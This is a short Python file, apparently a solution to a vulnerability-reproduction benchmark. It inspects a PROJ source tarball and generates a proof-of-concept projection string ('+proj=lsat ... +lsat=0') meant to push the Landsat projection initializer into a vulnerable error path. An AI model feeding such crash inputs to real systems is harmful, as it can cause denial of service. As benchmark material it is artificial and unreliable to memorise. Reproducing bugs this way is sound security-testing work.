import os
import tarfile
import re
from typing import Optional


class Solution:
    def _tar_contains_pj_lsat(self, src_path: str) -> bool:
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    n = (m.name or "").lower()
                    if n.endswith("pj_lsat.c") or n.endswith("/pj_lsat.c") or n.endswith("\\pj_lsat.c"):
                        return True
        except Exception:
            return False
        return False

    def _detect_ellps_token(self, src_path: str) -> str:
        # Prefer a universally supported ellipsoid parameter.
        # Keep it short: GRS80 -> 5 chars
        # If we can find evidence the build parses +R, we could use +R=1, but ellps is safer.
        return "+ellps=GRS80"

    def _detect_lsat_param_name(self, src_path: str) -> str:
        # Almost certainly "+lsat", but try to confirm from source.
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    n = (m.name or "").lower()
                    if n.endswith("pj_lsat.c") or n.endswith("/pj_lsat.c") or n.endswith("\\pj_lsat.c"):
                        f = tf.extractfile(m)
                        if not f:
                            break
                        data = f.read()
                        try:
                            s = data.decode("utf-8", "replace")
                        except Exception:
                            s = data.decode("latin-1", "replace")
                        if re.search(r'"\s*i\s*lsat\s*"', s) or re.search(r'"\s*t\s*lsat\s*"', s):
                            return "+lsat"
                        if re.search(r'"\s*i\s*landsat\s*"', s) or re.search(r'"\s*t\s*landsat\s*"', s):
                            return "+landsat"
                        break
        except Exception:
            pass
        return "+lsat"

    def solve(self, src_path: str) -> bytes:
        # Base proj string targeting the vulnerable projection.
        proj = "+proj=lsat"

        # Ensure projection initialization reaches lsat code (ellipsoid provided).
        ellps = self._detect_ellps_token(src_path)

        # Force an error path inside lsat initializer (out-of-range satellite number).
        lsat_key = self._detect_lsat_param_name(src_path)
        lsat_bad = f"{lsat_key}=0"

        poc = f"{proj} {ellps} {lsat_bad}"
        return poc.encode("ascii", "strict")